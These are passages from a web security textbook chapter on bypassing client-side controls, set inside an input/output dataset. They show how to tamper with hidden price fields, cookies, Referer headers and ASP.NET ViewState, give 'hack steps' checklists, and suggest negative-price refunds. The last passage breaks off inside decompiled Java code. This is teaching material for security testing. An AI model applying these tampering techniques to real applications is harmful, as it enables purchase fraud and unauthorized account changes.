writing applications in this way is\noften an easier task for developers, because it removes the need to keep track\nof all kinds of data within the user’s session. Reducing the amount of per-\nsession data being stored on the server can also improve the application’s\nperformance. Further, if an application is deployed on several load-balanced\nservers, with users potentially interacting with more than one server to per-\nform a multistep action, then it may not be straightforward to share server-\nside data between the hosts that may handle the same user’s requests. Using\nthe client to transmit data can present a tempting solution to the problem.\nHowever, transmitting sensitive data in this way is usually unsafe and has\nbeen the cause of countless vulnerabilities in applications.\nHidden Form Fields\nHidden HTML form fields are a common mechanism for transmitting data\nvia the client in a superficially unmodifiable way. If a field is flagged as hid-\nden, it is not displayed on-screen. However, the field’s name and value are\nstored within the form and sent back to the application when the user submits\nthe form.\nThe classic example of this security flaw is a retailing application that stores\nthe prices of products within hidden form fields. In the early days of web\napplications, this vulnerability was extremely widespread, and it by no means\nhas been eliminated today. Figure5-1 shows a typical form.\nFigure 5-1: A typical HTML form\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 97\nChapter 5 ■ Bypassing Client-Side Controls 97\nThe code behind this form is as follows:\n<form action=”order.asp” method=”post”>\n<p>Product: Sony VAIO A217S</p>\n<p>Quantity: <input size=”2” name=”quantity”>\n<input name=”price” type=”hidden” value=”1224.95”>\n<input type=”submit” value=”Buy!”></p>\n</form>\nNotice the form field called price, which is flagged as hidden. This field will\nbe sent to the server when the user submits the form:\nPOST /order.asp HTTP/1.1\nHost: wahh-app.com\nContent-Length: 23\nquantity=1&price=1224.95\nNow, although the price field is not displayed on-screen, and it is not\neditable by the user, this is solely because the application has instructed the\nbrowser to hide the field. Because everything that occurs on the client side is\nultimately within the user’s control, this restriction can be circumvented in\norder to edit the price.\nOne way to achieve this is to save the source code for the HTML page, edit\nthe value of the field, reload the source into a browser, and click the Buy but-\nton. However, a more elegant and easier method is to use an intercepting\nproxy to modify the desired data on the fly.\nAn intercepting proxy is tremendously useful when attacking a web appli-\ncation and is the one truly indispensable tool that you need in your arsenal.\nThere are numerous such tools available, but the most functional and popu-\nlar are:\n■■ Burp Proxy (part of Burp Suite)\n■■ WebScarab\n■■ Paros\nThe proxy sits between your web browser and the target application. It\nintercepts every request issued to the application, and every response received\nback, for both HTTP and HTTPS. It can trap any intercepted message for\ninspection or modification by the user. The proxies listedalso have numerous\nadvanced functions to make your job easier, including:\n■■ Fine-grained rules to control which messages are trapped.\n■■ Regex-based replacement of message content.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 98\n98 Chapter 5 ■ Bypassing Client-Side Controls\n■■ Automatic updating of the Content-Lengthheader when messages are\nmodified.\n■■ Browsing history and message cache.\n■■ Ability to replay and remodify individual requests.\n■■ Integration with other tools such as spiders and fuzzers.\nIf you have not installed or used a proxy tool before, see Chapter 19 for\ninstructions and for a comparison of the main tools available.\nOnce an intercepting proxy has been installed and suitably configured, you\ncan trap the request that submits the form, and modify the pricefield to any\nvalue, as shown in Figure5-2.\nFigure 5-2: Modifying the values of hidden form fields using an intercepting proxy\nIf the application processes the transaction based on the price submitted,\nthen you can purchase the product for any price of your choosing.\nTIP If you find an application that is vulnerable in this way, see whether you\ncan submit a negative amount as the price. In some cases, applications have\nactually accepted transactions using negative prices. The attacker receives a\nrefund to their credit card and also the goods which they ordered — a win-win\nsituation if ever there was one.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 99\nChapter 5 ■ Bypassing Client-Side Controls 99\nHTTP Cookies\nAnother common mechanism for transmitting data via the client is HTTP cook-\nies. As with hidden form fields, these are not normally displayed on-screen or\ndirectly modifiable by the user. They can, of course, be modified using an inter-\ncepting proxy, either by changing the server response that sets them, or subse-\nquent client requests that issue them.\nConsider the following variation on the previous example. When a cus-\ntomer logs in to the application, she receives the following response:\nHTTP/1.1 302 Found\nLocation: /home.asp\nSet-Cookie: SessId=191041-1042\nSet-Cookie: UID=1042\nSet-Cookie: DiscountAgreed=25\nThis response sets three cookies, all of which are interesting. The first\nappears to be a session token, which may be vulnerable to sequencing or other\nattacks. The second appears to be a user identifier, which can potentially be\nleveraged to exploit access control weaknesses. The third appears to represent\na discount rate that the customer will receive on purchases.\nThis third cookie points towards a classic case of relying on client-side con-\ntrols (the fact that cookies are normally unmodifiable) to protect data trans-\nmitted via the client. If the application trusts the value of the DiscountAgreed\ncookie when it is submitted back to the server, then customers can obtain arbi-\ntrary discounts by modifying its value. For example:\nPOST /order.asp HTTP/1.1\nHost: wahh-app.com\nCookie: SessId=191041-1042; UID=1042; DiscountAgreed=99\nContent-Length: 23\nquantity=1&price=1224.95\nURL Parameters\nApplications frequently transmit data via the client using preset URL parame-\nters. For example, when a user browses the product catalogue, the application\nmay provide them with hyperlinks to URLs like the following:\nhttps://wahh-app.com/browse.asp?product=VAIOA217S&price=1224.95\nWhen a URL containing parameters is displayed in the browser’s location\nbar, any parameters can be trivially modified by any user without the use of\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 100\n100 Chapter 5 ■ Bypassing Client-Side Controls\ntools. However, there are many instances in which an application may expect\nthat ordinary users cannot view or modify URL parameters. For example:\n■■ Where embedded images are loaded using URLs containing parameters.\n■■ Where URLs containing parameters are used to load the contents of a\nframe.\n■■ Where a form uses the POSTmethod and its target URL contains preset\nparameters.\n■■ Where an application uses pop-up windows or other techniques to con-\nceal the browser location bar.\nOf course, in any such case the values of any URL parameters can be modi-\nfied as previously using an intercepting proxy.\nThe Referer Header\nBrowsers include the Refererheader within most HTTP requests. This is used\nto indicate the URL of the page from which the current request originated—\neither because the user clicked a hyperlink or submitted a form, or because the\npage referenced other resources such as images. Hence, it can be leveraged as\na mechanism for transmitting data via the client: because the URLs processed\nby the application are within its control, developers may assume that the Ref-\nererheader can be used to reliably determine which URL generated a partic-\nular request.\nFor example, consider a mechanism that enables users to reset their pass-\nword if they have forgotten it. The application requires users to proceed\nthrough several steps in a defined sequence, before they actually reset their\npassword’s value with the following request:\nPOST /customer/ResetForgotPassword.asp HTTP/1.1\nReferer: http://wahh-app.com/customer/ForgotPassword.asp\nHost: wahh-app.com\nContent-Length: 44\nuname=manicsprout&pass=secret&confirm=secret\nThe application may use the Refererheader to verify that this request orig-\ninated from the correct stage (ForgotPassword.asp), and if so allow the user to\nreset their password.\nHowever, because the user controls every aspect of every request, including\nthe HTTP headers, this control can be trivially circumvented by proceeding\ndirectly to ResetForgotPassword.asp, and using an intercepting proxy to fix\nthe value of the Refererheader to the value that the application requires.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 101\nChapter 5 ■ Bypassing Client-Side Controls 101\nThe Referer header is strictly optional according to w3.org standards.\nHence although most browsers implement it, using it to control application\nfunctionality should be regarded as a “hack.”\nCOMMON MYTH It is often assumed that HTTP headers are somehow\nmore “tamper-proof” than other parts of the request, such as the URL. This\nmay lead developers to implement functionality that trusts the values\nsubmitted in headers such as Cookieand Referer, while performing proper\nvalidation of other data such as URL parameters. This perception is false—\ngiven the multitude of intercepting proxy tools that are freely available, any\namateur hacker who targets an application can change all request data with\ntrivial ease. It is rather like supposing that when the teacher comes to search\nyour desk, it is safer to hide your water pistol in the bottom drawer, because\nshe will need to bend down further to discover it.\nHACK STEPS\n■ Locate all instances within the application where hidden form fields,\ncookies, and URL parameters are apparently being used to transmit data\nvia the client.\n■ Attempt to determine or guess the purpose that the item plays in the\napplication’s logic, based on the context in which it appears and on clues\nsuch as the parameter’s name.\n■ Modify the item’s value in ways that are relevant to its purpose in the\napplication. Ascertain whether the application processes arbitrary values\nsubmitted in the parameter, and whether this exposes the application to\nany vulnerabilities.\nOpaque Data\nSometimes, data transmitted via the client is not transparently intelligible,\nbecause it has been encrypted or obfuscated in some way. For example, instead\nof seeing a product’s price stored in a hidden field, you may see some cryptic\nvalue being transmitted:\n<form action=”order.asp” method=”post”>\n<p>Product: Sony VAIO A217S</p>\n<p>Quantity: <input size=”2” name=”quantity”>\n<input name=”enc” type=”hidden” value=”262a4844206559224f456864206668643\n265772031383932654448a352484634667233683277384f2245556533327233666455225\n242452a526674696f6471”>\n<input type=”submit” value=”Buy!”></p>\n</form>\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 102\n102 Chapter 5 ■ Bypassing Client-Side Controls\nWhen this is observed, you may reasonably infer that when the form is sub-\nmitted, the server-side application will decrypt or deobfuscate the opaque string\nand perform some processing on its plaintext value. This further processing may\nbe vulnerable to any kind of bug; however, in order to probe for and exploit this,\nyou will first need to wrap up your payload in the appropriate way.\nHACK STEPS\nFaced with opaque data being transmitted via the client, there are a several\npossible avenues of attack:\n■ If you know the value of the plaintext behind the opaque string, you can\nattempt to decipher the obfuscation algorithm being employed.\n■ As described in Chapter 4, the application may contain functions else-\nwhere that you can leverage to return the opaque string resulting from a\npiece of plaintext you control. In this situation, you may be able to\ndirectly obtain the required string to deliver an arbitrary payload to the\nfunction you are targeting.\n■ Even if the opaque string is completely impenetrable, it may be possible\nto replay its value in other contexts, to achieve some malicious effect. For\nexample, the encparameter in the previously shown form may contain\nan encrypted version of the product’s price. Although it is not possible to\nproduce the encrypted equivalent for an arbitrary price of your choosing,\nyou may be able to copy the encrypted price from a different, cheaper\nproduct and submit this in its place.\n■ If all else fails, you can attempt to attack the server-side logic that will\ndecrypt or deobfuscate the opaque string, by submitting malformed vari-\nations of it—for example, containing overlong values, different character\nsets, and the like.\nThe ASP.NET ViewState\nOne commonly encountered mechanism for transmitting opaque data via the\nclient is the ASP.NET ViewState. This is a hidden field that is created by default\nin all ASP.NET web applications, and contains serialized information about\nthe state of the current page. The ASP.NET platform employs the ViewState to\nenhance server performance—it enables the server to preserve elements\nwithin the user interface across successive requests without needing to main-\ntain all of the relevant state information on the server side. For example, the\nserver may populate a drop-down list on the basis of parameters submitted by\nthe user. When the user makes subsequent requests, the browser does not\ns ubmit the contents of the list back to the server. However, the browser does\nsubmit the hidden ViewState field, which contains a serialized form of the list.\nThe server deserializes the ViewState and recreates the same list that is pre-\nsented back to the user again.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 103\nChapter 5 ■ Bypassing Client-Side Controls 103\nIn addition to this core purpose of the ViewState, developers can use it to\nstore arbitrary information across successive requests. For example, instead of\nsaving the product’s price in a hidden form field, an application may save it in\nthe ViewState as follows:\nstring price = getPrice(prodno);\nViewState.Add(“price”, price);\nThe form returned to the user will now look something like this:\n<form method=”post” action=”order.aspx”>\n<input type=”hidden” name=”__VIEWSTATE” id=”__VIEWSTATE”\nvalue=”/wEPDwUKMTIxNDIyOTM0Mg8WAh4FcHJpY2UFBzEyMjQuOTVkZA==” />\n<p>Product: Sony VAIO A217S</p>\n<p>Quantity: <input name=”quantity” id=”quantity” />\n<input type=”submit” name=”buy” value=”Buy!” />\n</form>\nand when the user submits the form, their browser will send the following:\nPOST /order.aspx HTTP/1.1\nHost: wahh-app.com\nContent-Length: 95\n__VIEWSTATE=%2FwEPDwUKMTIxNDIyOTM0Mg8WAh4FcHJpY2UFBzEyMjQuOTVkZA%3D%3D&q\nuantity=1&buy=Buy%21\nThe request apparently does not contain the product price—only the quan-\ntity ordered and the opaque ViewState parameter. Changing that parameter at\nrandom results in an error message, and the purchase is not processed.\nThe ViewState parameter is actually a Base64-encoded string, which can be\neasily decoded:\nFF 01 0F 0F 05 0D 0A 31 32 31 34 32 32 39 33 34 ; ÿ......121422934\n32 0F 16 02 1E 05 70 72 69 63 65 05 07 31 32 32 ; 2.....price..122\n34 2E 39 35 64 64 ; 4.95dd\nTIP When you are attempting to decode what appears to be a Base64-\nencoded string, a common mistake is to begin decoding at the wrong position\nwithin the string. Because of the way Base64 encoding works, if you start at the\nwrong position, the decoded string will contain gibberish. Base64 is a block-\nbased format in which each 4 bytes of encoded data translates into 3 bytes of\ndecoded data. Hence, if your attempts to decode a Base64 string do not\nuncover anything meaningful, try starting from four adjacent offsets into the\nencoded string. For example, cycling through the first four offsets into\nHh4aGVsbG8gd29ybGQugenerates the following results:\n— — [ È ÛÜ>\n‡††VÆÆò v÷&Æ\ná¡•±±¼ ´Y½É±\nhello world.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 104\n104 Chapter 5 ■ Bypassing Client-Side Controls\nThere are two versions of the ViewState format, corresponding to different\nversions of ASP.NET. Version 1.1 is a simple text-based format that is effec-\ntively a compressed form of XML. Version 2, which is becoming more preva-\nlent, is a binary format and is shown in the example. String-based data can be\neasily spotted, and the decoded ViewState clearly contains the product price\nthat was previously stored in a hidden HTML form field. You can simply\nchange the value of the price parameter in a hex editor.\nFF 01 0F 0F 05 0D 0A 31 32 31 34 32 32 39 33 34 ; ÿ......121422934\n32 0F 16 02 1E 05 70 72 69 63 65 05 01 31 64 64 ; 2.....price..1dd\nNOTE Strings within version 2 of the ViewState are length-prepended, so\nchanging the price parameter from 1224.95 to 1 also requires that you change\nthe length from 7 to 1, shown here.\nYou can then reencode the modified structure as Base64, and submit the\nnew ViewState value to the application:\nPOST /order.aspx HTTP/1.1\nHost: wahh-app.com\nContent-Length: 87\n__VIEWSTATE=%2FwEPDwUKMTIxNDIyOTM0Mg8WAh4FcHJpY2UFATFkZA%3d%3d&quantity=\n1&cmdBuy=Buy%21\nwhich enables you to purchase the product at a price of 1.\nUnfortunately, however, hacking ASP.NET applications is not usually as\nsimple as this. There is an option within ASP.NET for the platform to include a\nkeyed hash within the ViewState structure. This option is often on by default\nbut can be explicitly activated by adding the following to the page declaration:\nEnableViewStateMac=”true”\nThe EnableViewStateMac option is activated in around 90% of today’s\nASP.NET applications, meaning that the ViewState parameter cannot be\ntampered with without breaking the hash. In the previous example, using this\noption results in the following ViewState:\nFF 01 0F 0F 05 0A 31 32 31 34 32 32 39 33 34 32 ; ÿ.....1214229342\n0F 16 02 1E 05 70 72 69 63 65 05 07 31 32 32 34 ; .....price..1224\n2E 39 35 64 64 C4 75 60 70 9F 10 8B 61 04 15 27 ; .95ddÄu`pŸ.‹a..’\nA1 06 1E F0 35 16 F0 46 A8 ; ¡..ð5.ðF¨\nThe additional data after the end of the serialized form data is the keyed hash\nof the preceding structure. If you now try to modify the price parameter, you\ncannot create a valid hash without knowing the secret key, which is stored on the\nserver. Changing the price alone returns the error message shown in Figure5-3.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 105\nChapter 5 ■ Bypassing Client-Side Controls 105\nFigure 5-3: ASP.NET rejects requests containing a modified ViewState\nwhen the EnableViewStateMac option is set.\nEven if the ViewState parameter is properly protected to prevent tampering,\nit may still contain sensitive data stored by the application that could be of use\nto an attacker. You can use the ViewState deserializer in Burp Proxy to decode\nand render the ViewState on any given page to identify any sensitive data it\ncontains, as shown in Figure5-4.\nFigure 5-4: Burp Proxy can decode and render the ViewState, allowing you to review its\ncontents and edit these if the EnableViewStateMac option is not set."
  },
  {
    "input": "Capturing User Data: HTML Forms",
    "output": "70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 106\n106 Chapter 5 ■ Bypassing Client-Side Controls\nHACK STEPS\n■ If you are attacking an ASP.NET application, verify whether the\nEnableViewStateMacoption is activated. This is indicated by the pres-\nence of a 20-byte hash at the end of the ViewState structure, and you can\nuse the decoder in Burp Proxy to confirm whether this is present.\n■ Even if the ViewState is protected, decode the ViewState parameter on\nvarious different application pages to discover whether the application is\nusing the ViewState to transmit any sensitive data via the client.\n■ Try to modify the value of a specific parameter within the ViewState,\nwithout interfering with its structure, and see whether an error message\nresults.\n■ If you can modify the ViewState without causing errors, you should\nreview the function of each parameter within the ViewState, and whether\nthe application uses it to store any custom data. Try to submit crafted\nvalues as each parameter, to probe for common vulnerabilities, as you\nwould for any other item of data being transmitted via the client.\n■ Note that the keyed hash option may be enabled or disabled on a per-\npage basis, so it may be necessary to test each significant page of the\napplication for ViewState hacking vulnerabilities.\nCapturing User Data: HTML Forms\nThe other principal way in which applications use client-side controls to\nrestrict data submitted by clients occurs with data that was not originally spec-\nified by the server but was gathered on the client computer itself.\nHTML forms are the simplest and most common mechanism for capturing\ninput from the user and submitting it to the server. In the most basic uses of this\nmethod, users type data into named text fields, which are submitted to the server\nas name/value pairs. However, forms can be used in other ways, which are\ndesigned to impose restrictions or perform validation checks on the user-supplied\ndata. When an application employs these client-side controls as a security mech-\nanism, to defend itself against malicious input, the controls can usually be triv-\nially circumvented, leaving the application potentially vulnerable to attack.\nLength Limits\nConsider the following variation on the original HTML form, which imposes a\nmaximum length of 3 on the quantity field:\n<form action=”order.asp” method=”post”>\n<p>Product: Sony VAIO A217S</p>\n<p>Quantity: <input size=”2” maxlength=”3” name=”quantity”>\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 107\nChapter 5 ■ Bypassing Client-Side Controls 107\n<input name=”price” type=”hidden” value=”1224.95”>\n<input type=”submit” value=”Buy!”></p>\n</form>\nHere, the browser will prevent the user from entering any more than three\ncharacters into the input field, and so the server-side application may assume\nthat the quantity parameter it receives will be no longer than this. However,\nthe restriction can be easily circumvented either by intercepting the request\ncontaining the form submission to enter an arbitrary value, or by intercepting\nthe response containing the form to remove the maxlengthattribute.\nINTERCEPTING RESPONSES\nWhen you are attempting to intercept and modify server responses, you may\nfind that the relevant message displayed in your proxy looks like this:\nHTTP/1.1 304 Not Modified\nDate: Wed, 21 Feb 2007 22:40:20 GMT\nEtag: “6c7-5fcc0900”\nExpires: Thu, 22 Feb 2007 00:40:20 GMT\nCache-Control: max-age=7200\nThis response arises because the browser already possesses a cached copy\nof the resource it requested. When the browser requests a cached resource, it\ntypically adds two additional headers to the request, called If-Modified-\nSinceand If-None-Match:\nGET /scripts/validate.js HTTP/1.1\nHost: wahh-app.com\nIf-Modified-Since: Sat, 17 Feb 2007 19:48:20 GMT\nIf-None-Match: “6c7-5fcc0900”\nThese headers tell the server the time at which the browser last updated its\ncached copy, and the Etagstring, which the server provided with that copy of\nthe resource. The Etagis a kind of serial number that the server assigns to\neach cacheable resource and that it updates each time the resource is\nmodified. If the server possesses a newer version of the resource than the date\nspecified in the If-Modified-Sinceheader, or if the Etagof the current\nversion does match the one specified in the If-None-Matchheader, then the\nserver will respond with the latest version of the resource. Otherwise, it will\nreturn a 304 response as shown here, informing the browser that the resource\nhas not been modified and that the browser should use its cached copy.\nWhen this occurs, and you need to intercept and modify the resource that\nthe browser has cached, you can intercept the relevant request and remove the\nIf-Modified-Sinceand If-None-Matchheaders, causing the server to\nrespond with the full version of the requested resource. Burp Proxy contains an\noption to strip these headers from every request, thereby overriding all cache\ninformation sent by the browser.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 108\n108 Chapter 5 ■ Bypassing Client-Side Controls\nHACK STEPS\n■ Look for form elements containing a maxlengthattribute. Submit data\nthat is longer than this length but that is validly formatted in other\nrespects (e.g., is numeric if the application is expecting a number).\n■ If the application accepts the overlong data, you may infer that the\nclient-side validation is not replicated on the server.\n■ Depending on the subsequent processing that the application performs\non the parameter, you may be able to leverage the defects in validation\nto exploit other vulnerabilities such as SQL injection, cross-site scripting,\nor buffer overflows.\nScript-Based Validation\nThe input validation mechanisms built into HTML forms themselves are\nextremely simple, and are insufficiently fine-grained to perform relevant vali-\ndation of many kinds of input. For example, a user registration form might\ncontain fields for name, email address, telephone number, and ZIP code, all of\nwhich expect different types of input. It is therefore very common to see cus-\ntomized client-side input validation implemented within scripts. Consider the\nfollowing variation on the original example:\n<script>\nfunction ValidateForm(theForm)\n{\nvar isInteger = /^\\d+$/\nif(!isInteger.test(theForm.quantity.value))\n{\nalert(“Please enter a valid quantity”);\nreturn false;\n}\nreturn true;\n}\n</script>\n<form action=”order.asp” method=”post” onsubmit=”return\nValidateForm(this)“>\n<p>Product: Sony VAIO A217S</p>\n<p>Quantity: <input size=”2” name=”quantity”>\n<input name=”price” type=”hidden” value=”1224.95”>\n<input type=”submit” name=”buy” value=”Buy!”></p>\n</form>\nThe onsubmit attribute of the form tag instructs the browser to execute the\nValidateFormfunction when the user clicks the submit button and to submit the\nform only if this function returns true. This mechanism enables the client-side\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 109\nChapter 5 ■ Bypassing Client-Side Controls 109\nlogic to intercept an attempted form submission, perform customized validation\nchecks on the user’s input, and decide whether to accept that input accordingly.\nIn the above example, the validation is extremely simple and checks whether the\ndata entered in the amount field is an integer.\nClient-side controls of this kind are usually trivial to circumvent, and it is\nnormally sufficient to disable JavaScript within the browser. If this is done, the\nonsubmit attribute is ignored, and the form is submitted without any custom\nvalidation.\nHowever, disabling JavaScript altogether may break the application if it\ndepends upon client-side scripting for its normal operation (such as construct-\ning parts of the user interface). A neater approach is to enter a benign value\ninto the input field in the browser, and then intercept the validated submission\nwith your proxy and modify the data to your desired value.\nAlternatively, you can intercept the server’s response that contains the\nJavaScript validation routine and modify the script to neutralize its effect—in\nthe previous example, by changing the ValidateFormfunction to return true in\nevery case.\nHACK STEPS\n■ Identify any cases where client-side JavaScript is used to perform input\nvalidation prior to form submission.\n■ Submit data to the server that the validation would ordinarily have\nblocked, either by modifying the submission request to inject invalid\ndata or by modifying the form validation code to neutralize it.\n■ As with length restrictions, determine whether the client-side controls\nare replicated on the server, and if not, whether this can be exploited for\nany malicious purpose.\n■ Note that if multiple input fields are subjected to client-side validation\nprior to form submission, you need to test each field individually with\ninvalid data, while leaving valid values in all of the other fields. If you\nsubmit invalid data in multiple fields simultaneously, it is possible that\nthe server will stop processing the form when it identifies the first invalid\nfield, and so your testing is not reaching all possible code paths within\nthe application.\nNOTE Client-side JavaScript routines to validate user input are extremely\ncommon in web applications but do not infer that every such application is\nvulnerable. The application is exposed only if client-side validation is not\nreplicated on the server, and even then only if crafted input that circumvents\nclient-side validation can be used to cause some undesirable behavior by the\napplication.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 110\n110 Chapter 5 ■ Bypassing Client-Side Controls\nIn the majority of cases, client-side validation of user input has beneficial\neffects on the application’s performance and the quality of the user experience.\nFor example, when filling out a detailed registration form, an ordinary user\nmight make various mistakes, such as omitting required fields or formatting\ntheir telephone number incorrectly. In the absence of client-side validation,\ncorrecting these mistakes may entail several reloads of the page, and round-\ntrip messages to the server. Implementing basic validation checks on the client\nside makes the user’s experience much smoother and reduces the load on the\nserver.\nDisabled Elements\nIf an element on an HTML form is flagged as disabled, it appears on-screen but\nis usually grayed out and is not editable or usable in the way an ordinary con-\ntrol is. Also, it is not sent to the server when the form is submitted. For exam-\nple, consider the following form:\n<form action=”order.asp” method=”post”>\n<p>Product: <input disabled=”true” name=”product” value=”Sony VAIO\nA217S”></p>\n<p>Quantity: <input size=”2” name=”quantity”>\n<input name=”price” type=”hidden” value=”1224.95”>\n<input type=”submit” value=”Buy!”></p>\n</form>\nThis includes the name of the product as a disabled text field and appears on-\nscreen as shown in Figure5-5.\nFigure 5-5: A form containing a disabled input field\nThe behavior of this form is identical to the original example: the only para-\nmeters submitted are quantity and price. However, the presence of a dis-\nabled field suggests that this parameter may originally have been used by the\napplication. Earlier versions of the form may have included a hidden or\neditable field containing the product name. This would have been submitted\nto the server and may have been processed by the application. Modifying the\nname of the product may not appear to be as promising an attack as modify-\ning its price. However, if this parameter is processed, then it may be vulnera-\nble to many kinds of bugs such as SQL injection or cross-site scripting, which\nare of interest to an attacker."
  },
  {
    "input": "Capturing User Data: Thick-Client Components",
    "output": "70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 111\nChapter 5 ■ Bypassing Client-Side Controls 111\nHACK STEPS\n■ Look for disabled elements within each form of the application. When-\never one is found, try submitting it to the server along with the form’s\nother parameters, to determine whether it has any effect.\n■ Often, submit elements are flagged as disabled so that buttons appear as\ngrayed out in contexts when the relevant action is not available. You\nshould always try to submit the names of these elements, to determine\nwhether the application performs a server-side check before attempting\nto carry out the requested action.\n■ Note that browsers do not include disabled form elements when forms\nare submitted, and so you will not identify these if you simply walk\nthrough the application’s functionality monitoring the requests issued by\nthe browser. To identify disabled elements, you need to monitor the\nserver’s responses or view the page source in your browser. You can also\nuse the automated “find and replace” function of your intercepting proxy\nto remove occurrences of the disabled attribute within input tags. See\nChapter 19 for details of this feature.\nCapturing User Data: Thick-Client Components\nBesides HTML forms, the other main method for capturing, validating, and\nsubmitting user data is to use a thick-client component. The technologies you\nare most likely to encounter here are Java applets, ActiveX controls, and\nShockwave Flash objects.\nThick-client components can capture data in various different ways, both via\ninput forms and in some cases by interacting with the client operating system’s\nfile system or registry. They can perform arbitrarily complex validation and\nmanipulation of captured data prior to submission to the server. Further,\nbecause their internal workings are less transparently visible than HTML forms\nand JavaScript, developers are more likely to assume that the validation they\nperform cannot be circumvented. For this reason, thick-client components are\noften a fruitful means of discovering vulnerabilities within web applications.\nNOTE Whatever validation and processing a thick-client component performs,\nif it submits data to the server in a transparent manner, then this data can be\nmodified using an intercepting proxy in just the same way as described for HTML\nform data. For example, a thick-client component supporting an authentication\nmechanism might capture user credentials, perform some validation on these,\nand submit the values to the server as plaintext parameters within the request.\nThe validation can be trivially circumvented without performing any analysis or\nattack on the component itself.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 112\n112 Chapter 5 ■ Bypassing Client-Side Controls\nThick-client components present a more interesting and challenging target\nwhen the data they capture is obfuscated in some manner before being\ntransmitted to the server. In this situation, modifying the submitted values\nwill typically break the obfuscation and so will be rejected by the server.\nTo circumvent the validation, it is necessary to look inside the thick-client\ncomponent itself, understand the validation and obfuscation it performs,\nand subvert its processing in some way so as to achieve your objective.\nJava Applets\nJava applets are a popular choice of technology for implementing thick-client\ncomponents because they are cross-platform and they run in a sandboxed\nenvironment which mitigates against various kinds of security problems that\ncan afflict more heavyweight thick-client technologies.\nAs a result of running in a sandbox, Java applets cannot normally access\noperating system resources such as the file system. Hence, their main use as a\nclient-side control is to capture user input or other in-browser information.\nConsider the following extract of HTML source, which loads a Java applet con-\ntaining a game:\n<script>\nfunction play()\n{\nalert(“you scored “ + TheApplet.getScore());\ndocument.location = “submitScore.jsp?score=” +\nTheApplet.getObsScore() + “&name=” +\ndocument.playForm.yourName.value;\n}\n</script>\n<form name=playForm>\n<p>Enter name: <input type=”text” name=”yourName” value=”“></p>\n<input type=”button” value=”Play” onclick=JavaScript:play()>\n</form>\n<applet code=”https://wahh-game.com/JavaGame.class”\nid=”TheApplet”></applet>\nIn this code, the applet tag instructs the browser to load a Java applet from\nthe specified URL and instantiate it with the name TheApplet. When the user\nclicks the Play button, a JavaScript routine executes that invokes the getScore\nmethod of the applet. This is when the actual game play takes place, after which\nthe score is displayed in an alert dialog. The script then invokes the getObsScore\nmethod of the applet, and submits the returned value as a parameter to the\nsubmitScore.jspURL, together with the name entered by the user.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 113\nChapter 5 ■ Bypassing Client-Side Controls 113\nFor example, playing the game results in a dialog like the one shown in Fig-\nure5-6, followed by a request for a URL with this form:\nhttps://wahh-game.com/submitScore.jsp?score=\nc1cc3139323c3e4544464d51515352585a61606a6b&name=daf\nwhich generates an entry in the high-scores table with a value of 38.\nFigure 5-6: A dialog produced when\nthe applet-based game is played\nIt appears, therefore, that the long string that is returned by the getObsScore\nmethod, and submitted in the score parameter, contains an obfuscated repre-\nsentation of your score. If you want to cheat the game and submit an arbitrary\nhigh score, you will need to figure out a way of correctly obfuscating your cho-\nsen score, so that it is decoded in the normal way by the server.\nOne approach you may consider is to harvest a large number of scores\ntogether with their obfuscated equivalents, and attempt to reverse engineer\nthe obfuscation algorithm. However, suppose that you play the game several\ntimes, always scoring 38 and observe the following values being submitted:\nbb58303981393b424d4a5059575c616a676d72757b818683\n5f48303981393b41474951585861606a656f6f7377817f828b\nfd20303981393b4149495651555c66686a6c73797680848489\n370c303981393b42494a505359606361696e76787b828584\nb5bc303981393b454549545a5a5e6365656971717d818388\n1744303981393b43464d515a585f5f646b6f7477767f7e86\nf3d4303981393b494a4b5653556162616e6d6f7577827e\nde08303981393b474a4d5357595b5d69676a7178757b\nda40303981393b43464b54545b6060676e6d70787e7b7e85\n1aec303981393b434d4b5054556266646c6b6e717a7f80\nEach time you submit a score of 38, a portion of the obfuscated string\nremains constant, but the majority of it changes in unpredictable ways. You\nfind that if you modify any of the obfuscated score, it is rejected by the server.\nAttempting to reverse engineer the algorithm based on observed values could\nbe a very difficult task.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 114\n114 Chapter 5 ■ Bypassing Client-Side Controls\nNOTE The idea of attacking a Java-based game to submit an arbitrary score\nmay appear frivolous. However, thick-client components are employed by many\ncasino web sites, which play for real money. Posting an arbitrary score to an\napplication like this may be a very serious business!\nDecompiling Java Bytecode\nA much more promising approach is to decompile the applet to obtain its\nsource code. Languages like Java are not compiled into native machine\ninstructions, but to an intermediate language called bytecode, which is inter-\npreted at runtime by a virtual machine. Normally, Java bytecode can be\ndecompiled to recover its original source code without too many problems.\nTo decompile a client-side applet, you first need to save a copy of it to disk.\nYou can do this simply by using your browser to request the URL specified in\nthe codeattribute of the applettag shown previously.\nThere are various tools available that can decompile Java bytecode. The fol-\nlowing example shows partial output from one such tool, Jad:\nE:\\>jad.exe JavaGame.class\nParsing JavaGame.class... Generating JavaGame.jad\nE:\\>type JavaGame.jad\n// Decompiled by Jad v1.5.8f. Copyright 2001 Pavel Kouznetsov.\n// Jad home page: http://www.kpdus.com/jad.html\n// Decompiler options: packimports(3)\n// Source File Name: JavaGame.java\nimport java.applet.Applet;\nimport java.awt.Graphics;\npublic class JavaGame extends Applet\n{\npublic int getScore()\n{\nplay();\nreturn score;\n}\npublic String getObsScore()\n{\nreturn obfuscate(Integer.toString(score) + “|” +\nDouble.toString(Math.random()));\n}\npublic static String obfuscate(String input)\n{\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 115\nChapter 5 ■ Bypassing Client-Side Controls 115\nreturn hexEncode(checksum(input) + scramble(input));\n}\nprivate static String scramble(String input)\n{\nStringBuffer output = new StringBuffer();\nfor(int i = 0; i < input.length(); 